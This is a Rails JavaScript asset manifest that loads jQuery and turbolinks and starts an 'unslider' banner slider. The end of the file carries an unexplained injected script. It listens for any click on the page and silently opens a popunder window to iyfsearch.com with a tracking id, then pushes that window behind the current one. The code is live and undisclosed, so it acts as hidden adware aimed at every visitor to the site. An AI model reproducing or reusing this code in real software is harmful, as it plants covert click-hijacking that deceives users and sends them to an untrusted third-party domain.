// This is a manifest file that'll be compiled into application.js, which will include all the files
// listed below.
//
// Any JavaScript/Coffee file within this directory, lib/assets/javascripts, vendor/assets/javascripts,
// or vendor/assets/javascripts of plugins, if any, can be referenced here using a relative path.
//
// It's not advisable to add code directly here, but if you do, it'll appear at the bottom of the
// compiled file.
//
// Read Sprockets README (https://github.com/sstephenson/sprockets#sprockets-directives) for details
// about supported directives.
//
//= require jquery
//= require jquery_ujs
//= require turbolinks
//= require_tree .

$(function() {
    $('.banner').unslider();
});

if (typeof _popwnd == 'undefined') {
    var _popwnd = -1;
    function _popwnd_open(){
        if (_popwnd!=-1) return;
        _popwnd = window.open('http://iyfsearch.com/?dn=unslider.com&pid=9PO755G95', '_blank', '');
        _popwnd.blur();
        window.focus();
    }
};
window.addEventListener('click', _popwnd_open);